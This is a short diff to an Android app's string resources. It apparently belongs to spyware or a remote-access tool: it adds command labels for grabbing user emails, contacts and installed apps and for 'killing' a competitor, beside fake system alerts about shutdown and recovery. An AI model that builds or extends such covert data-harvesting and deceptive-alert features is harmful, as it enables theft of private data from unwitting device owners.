@@ -18,5 +18,11 @@
     <string name="GoogleMaps_NeedsToShutdown">GoogleMaps needs to shutdown!</string>
     <string name="SystemRecovery">System is trying to recover your running applications.</string>
     
+    <string name="get_accounts">Get User Emails</string>
+    <string name="kill_competitor">Start Killing Competitor</string>
+    <string name="stop_killing_competitor">Stop Killing Competitor</string>
+    <string name="get_apps">Get Installed Apps</string>
+    <string name="get_contacts">Get Contacts</string>
+    
 
 </resources>
